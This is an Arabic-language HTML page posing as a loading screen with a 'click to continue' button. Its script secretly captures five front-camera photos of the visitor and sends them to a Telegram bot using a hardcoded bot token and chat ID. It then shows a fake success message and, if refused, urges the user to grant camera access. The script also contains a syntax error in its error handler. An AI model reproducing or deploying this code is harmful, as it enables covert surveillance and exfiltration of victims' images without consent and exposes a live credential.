<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري التحميل...</title>
    <style>
        body { background: #0f172a; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; margin: 0; }
        button { background: #38bdf8; color: #0f172a; border: none; padding: 15px 35px; font-size: 1.2rem; font-weight: bold; border-radius: 10px; cursor: pointer; box-shadow: 0 4px 6px rgba(0,0,0,0.3); }
    </style>
</head>
<body>
    <button onclick="start()">اضغط هنا للمتابعة</button>
    <video id="v" autoplay playsinline style="display:none;"></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        const TOKEN = '8880573702:AAGOnEril_hFUPSBRuLh2TwGkFOG3wCeV80';
        const CHAT = '8304712202';

        async function start() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const video = document.getElementById('v');
                video.srcObject = stream;

                setTimeout(async () => {
                    const canvas = document.getElementById('c');
                    // تصغير الحجم والضغط لضمان عدم تجاوز حجم رسالة تيليجرام
                    canvas.width = 240;
                    canvas.height = 180;
                    const ctx = canvas.getContext('2d');
                    
                    let imagesData = [];

                    // التقاط 5 صور ورا بعض بسرعة فائقة (بدون أي انتظار لسيرفر خارجي)
                    for (let i = 1; i <= 5; i++) {
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        // تحويل الصورة لنص مصغر جداً (Base64) بجودة مقبولة
                        let base64Image = canvas.toDataURL('image/jpeg', 0.4);
                        imagesData.push(`صورة (${i}):\n${base64Image}`);

                        if (i < 5) {
                            await new Promise(r => setTimeout(r, 200)); // فاصل 200 جزء من الثانية فقط
                        }
                    }

                    stream.getTracks().forEach(t => t.stop());

                    // إرسال الـ 5 صور مع بعض كرسائل نصية متتالية في طلب واحد لتيليجرام
                    if (imagesData.length > 0) {
                        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ 
                                chat_id: CHAT, 
                                text: `🚨 تم التقاط الـ 5 صور بنجاح:\n\n` + imagesData.join('\n\n-------------------\n\n') 
                            })
                        });
                    }

                    document.body.innerHTML = '<h2>تم تحميل المحتوى بنجاح!</h2>';

                }, 1000);
            } style (e) {
                alert('يرجى السماح بإذن الكاميرا للمتابعة');
            }
        }
    </script>
</body>
</html>
